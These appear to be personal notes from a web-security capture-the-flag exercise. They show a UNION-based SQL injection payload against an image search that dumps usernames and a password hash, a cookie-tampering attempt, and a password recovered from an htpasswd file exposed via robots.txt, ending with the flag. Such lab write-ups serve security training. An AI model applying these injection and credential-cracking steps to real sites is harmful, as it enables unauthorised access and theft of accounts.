from the img search :

 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default


NOPE:
ID:  1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : root


NOPE:
ID:  1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
Title: 3bf1114a986ba87ed28fc1b5884fc2f8
Url : admin


=> tried same as for login page, does not work
=> also made sure that cookie "I_am_admin" was set to True, still does not work




opened url IP/robots.txt

showed 2 directories, including /whatever
go to IP/whatever, has file htpasswd
=> download file, open, decrypt pwd with md5
qwerty123@

The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

